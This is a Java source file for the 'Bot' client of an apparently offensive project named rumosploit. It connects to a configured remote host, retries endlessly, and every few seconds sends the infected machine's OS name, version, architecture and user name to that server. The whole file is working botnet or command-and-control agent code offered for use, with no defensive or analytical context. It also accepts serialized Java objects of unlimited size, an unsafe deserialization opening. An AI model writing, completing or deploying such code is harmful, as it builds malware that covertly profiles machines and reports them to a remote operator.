package com.github.rumoel.rumosploit.bot;

import java.io.IOException;
import java.io.InputStream;
import java.lang.invoke.MethodHandles;
import java.net.InetSocketAddress;

import org.apache.mina.core.future.ConnectFuture;
import org.apache.mina.core.session.IdleStatus;
import org.apache.mina.filter.codec.ProtocolCodecFilter;
import org.apache.mina.filter.codec.serialization.ObjectSerializationCodecFactory;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;
import com.github.rumoel.rumosploit.bot.header.Header;
import com.github.rumoel.rumosploit.bot.network.packet.ReadyPacket;

public class Bot extends Thread {

	static Logger logger = LoggerFactory.getLogger(MethodHandles.lookup().lookupClass());

	public void readConfig() throws IOException {
		ObjectMapper mapper = new ObjectMapper(new YAMLFactory());
		InputStream configStream = getClass().getClassLoader().getResource("bconfig.yml").openStream();
		Header.setConfig(mapper.readValue(configStream, BotConfig.class));
	}

	public void initNetwork() {
		ObjectSerializationCodecFactory oscf = new ObjectSerializationCodecFactory();
		oscf.setDecoderMaxObjectSize(Integer.MAX_VALUE);
		Header.getNioSocketConnector().setHandler(Header.getHandler());
		Header.getNioSocketConnector().getFilterChain().addLast("codec", new ProtocolCodecFilter(oscf));
		Header.getNioSocketConnector().getSessionConfig().setIdleTime(IdleStatus.BOTH_IDLE, 10);
	}

	@Override
	public void run() {
		try {
			reconnect();
		} catch (Exception e) {
			e.printStackTrace();
		}

		startThreads();

	}

	private void startThreads() {
		startDataGetter();
		startDataSender();
	}

	private void startDataGetter() {
		new Thread(() -> {
			do {
				setBotEntityData();
				try {
					Thread.sleep(3000);
				} catch (Exception e) {
					e.printStackTrace();
				}
			} while (true);
		}, "OsdataGetter").start();
	}

	public void setBotEntityData() {
		BotEntity data = Header.getBotEntity();

		data.setOsName(System.getProperty("os.name"));
		data.setOsVersion(System.getProperty("os.version"));
		data.setOsArch(System.getProperty("os.arch"));

		data.setOsUserName(System.getProperty("user.name"));

	}

	private void startDataSender() {
		new Thread(() -> {
			do {
				BotEntity data = Header.getBotEntity();
				Header.getSession().write(data);
				try {
					Thread.sleep(4000);
				} catch (Exception e) {
					e.printStackTrace();
				}
			} while (true);
		}, "dataSender").start();
	}

	public void reconnect() throws InterruptedException {
		if (Header.getConfig().isDebug()) {
			logger.warn("reconnect");
		}

		for (;;) {
			try {
				connect();
				break;
			} catch (org.apache.mina.core.RuntimeIoException e) {
				e.getClass();// IGNORE
			} catch (Exception e) {
				e.printStackTrace();
				if (Header.getConfig().isDebug()) {
					logger.error("Failed to connect.[{}] by {}", e.getMessage(), e.getCause().getMessage());
				}
				Thread.sleep(5000);
			}
		}
	}

	private void connect() {
		if (Header.getConfig().isDebug()) {
			logger.warn("connect");
		}
		String host = Header.getConfig().getHost();
		int port = Header.getConfig().getPort();
		ConnectFuture future = Header.getNioSocketConnector().connect(new InetSocketAddress(host, port));
		future.awaitUninterruptibly();
		Header.setSession(future.getSession());
		Header.getSession().write(new ReadyPacket());
	}

	public void reload() {
		throw new UnsupportedOperationException();
	}

	public void restart() {
		throw new UnsupportedOperationException();

	}

	public void stopF() {
		throw new UnsupportedOperationException();
	}

}
